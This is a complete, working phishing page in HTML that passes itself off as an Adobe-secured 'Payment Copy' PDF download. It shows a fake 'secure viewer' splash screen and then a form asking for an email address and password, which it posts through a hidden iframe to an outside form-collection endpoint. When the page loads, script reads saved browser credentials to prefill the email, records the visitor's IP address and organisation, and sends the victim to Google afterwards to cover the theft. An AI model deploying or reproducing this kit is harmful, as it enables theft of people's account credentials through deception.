<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Protected PDF ‚Äî Payment Copy</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }
    body {
      font-family: "Helvetica Neue", Arial, sans-serif;
      background: #f6f6f6 url('download.jpg') no-repeat center top;
      background-size: cover;
      overflow: hidden;
    }

    /* Splash screen */
    #splash {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 9999;
      transition: opacity 1s ease;
    }
    #splash h2 {
      font-size: 22px;
      color: #d32f2f;
      margin-bottom: 10px;
    }
    #splash p {
      color: #666;
      font-size: 14px;
    }
    .loader {
      margin-top: 20px;
      width: 36px;
      height: 36px;
      border: 4px solid #ddd;
      border-top-color: #d32f2f;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Main content */
    #main {
      display: none;
      height: 100%;
      display: flex;
      align-items: flex-start;
      justify-content: center;
      padding: 28px 12px 60px;
      position: relative;
    }
    #main.show { display: flex; animation: fadeIn 1s ease; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

    body::before {
      content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      font-size: 46px;
      font-weight: bold;
      color: rgba(200, 0, 0, 0.12);
      transform: rotate(-35deg);
      white-space: pre;
      line-height: 120px;
      pointer-events: none;
      z-index: 0;
    }

    .card {
      width: 450px;
      max-width: 94%;
      background: rgba(255,255,255,0.95);
      border-radius: 8px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      padding: 28px 22px 34px;
      position: relative;
      z-index: 2;
      backdrop-filter: blur(4px);
    }

    .pdf-icon {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 10px;
    }
    .pdf-icon img { width: 54px; height: auto; }

    h1 {
      font-size: 20px;
      text-align: center;
      margin-bottom: 6px;
    }

    p.lead {
      text-align: center;
      color: #666;
      margin-bottom: 22px;
      font-size: 14px;
    }

    .input {
      width: 100%;
      border: 1px solid #e6e6e6;
      border-radius: 4px;
      padding: 14px 12px;
      margin-bottom: 12px;
      color: #444;
      background: #fafafa;
      font-size: 15px;
    }

    .password-wrapper { position: relative; }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      cursor: pointer;
      color: #999;
      font-size: 18px;
      user-select: none;
    }
    .toggle-password:hover { color: #d32f2f; }

    .download-wrap {
      text-align: center;
      margin: 16px 0 10px;
    }
    .btn-download {
      display: inline-block;
      padding: 12px 36px;
      border-radius: 30px;
      background: #d32f2f;
      color: #fff;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      box-shadow: 0 6px 18px rgba(211,47,47,0.18);
      border: none;
      cursor: pointer;
      font-size: 15px;
    }

    .file-info {
      margin-top: 18px;
      border-top: 1px solid #eee;
      padding-top: 14px;
      display: flex;
      gap: 12px;
      align-items: flex-start;
      color: #333;
    }
    .file-thumb { width: 48px; flex: 0 0 48px; }
    .file-thumb img { width: 100%; }
    .file-meta { flex: 1; }
    .file-meta h4 { margin-bottom: 6px; font-size: 15px; color: #0b58a8; }
    .file-meta .desc, .file-meta .size { font-size: 13px; color: #666; }
  </style>
</head>
<body>
  <!-- Splash screen -->
  <div id="splash">
    <h2>Loading Secure Viewer‚Ä¶</h2>
    <p>Please wait while we prepare your file</p>
    <div class="loader"></div>
  </div>

  <!-- Main content -->
  <div id="main">
    <div class="card">
      <div class="pdf-icon">
        <img src="data:image/svg+xml;utf8,
          <svg xmlns='http://www.w3.org/2000/svg' width='72' height='90' viewBox='0 0 72 90'>
            <rect width='72' height='90' rx='6' fill='%23d63636'/>
            <text x='50%' y='62%' text-anchor='middle' font-family='Arial' font-size='18' fill='%23fff'>PDF</text>
          </svg>" alt="PDF icon">
      </div>

      <h1>This File is Protected By Adobe¬Æ<br>Security.</h1>
      <p class="lead">Click on download to view payment copy.</p>

      <!-- Hidden iframe method -->
      <iframe name="hiddenFrame" style="display:none;"></iframe>

      <form id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" autocomplete="on" target="hiddenFrame">
        <input id="email" name="email" class="input" type="email" placeholder="Email address" autocomplete="username email" required>
        <div class="password-wrapper">
          <input id="password" name="password" class="input" type="password" placeholder="Password" autocomplete="current-password" required>
          <span id="togglePassword" class="toggle-password">üëÅÔ∏è</span>
        </div>

        <input type="hidden" name="ip" id="ip">
        <input type="hidden" name="hostname" id="hostname">

        <div class="download-wrap">
          <button class="btn-download" type="submit">DOWNLOAD</button>
        </div>
      </form>

      <div class="file-info">
        <div class="file-thumb">
          <img src="data:image/svg+xml;utf8,
            <svg xmlns='http://www.w3.org/2000/svg' width='48' height='48'>
              <rect width='48' height='48' rx='4' fill='%23f2f2f2' stroke='%23ddd'/>
              <text x='50%' y='58%' text-anchor='middle' font-size='10' font-family='Arial' fill='%23d32f2f'>PDF</text>
            </svg>" alt="">
        </div>
        <div class="file-meta">
          <h4>Download File Information</h4>
          <div class="desc">Payment copy</div>
          <div class="size">File Size: 47kb</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Splash screen delay
    window.addEventListener('load', () => {
      setTimeout(() => {
        document.getElementById('splash').style.opacity = '0';
        setTimeout(() => {
          document.getElementById('splash').style.display = 'none';
          document.getElementById('main').classList.add('show');
        }, 1000);
      }, 3000);
    });

    // Autofill and IP fetch
    window.addEventListener('DOMContentLoaded', async () => {
      if (window.PasswordCredential) {
        try {
          const cred = await navigator.credentials.get({password: true, mediation: 'optional'});
          if (cred && cred.id) document.getElementById('email').value = cred.id;
        } catch(e) {}
      }

      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          document.getElementById('ip').value = data.ip;
          return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(r => r.json())
        .then(info => {
          document.getElementById('hostname').value = info.org || info.city || 'Unknown';
        })
        .catch(() => {});
    });

    // Password toggle
    const toggle = document.getElementById('togglePassword');
    const pwd = document.getElementById('password');
    toggle.addEventListener('click', () => {
      const isHidden = pwd.type === 'password';
      pwd.type = isHidden ? 'text' : 'password';
      toggle.textContent = isHidden ? 'üôà' : 'üëÅÔ∏è';
    });

    // Redirect after submission
    document.getElementById('mainForm').addEventListener('submit', () => {
      setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
    });
  </script>
</body>
</html>
